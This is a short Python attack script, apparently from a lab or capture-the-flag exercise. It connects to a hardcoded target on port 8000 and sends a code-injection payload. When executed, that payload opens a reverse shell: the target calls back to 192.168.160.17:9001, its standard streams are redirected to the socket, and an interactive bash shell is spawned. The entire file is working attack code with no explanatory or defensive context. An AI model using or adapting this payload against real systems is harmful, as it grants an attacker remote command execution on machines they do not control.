import socket

#hostname = input("Hostname (IP or hostname): ")
#port = int(input("Port: "))

hostname = "10.80.187.162"
port = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((hostname, port))

s.sendall(b'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.160.17",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")')

data = s.recv(1024)

s.close()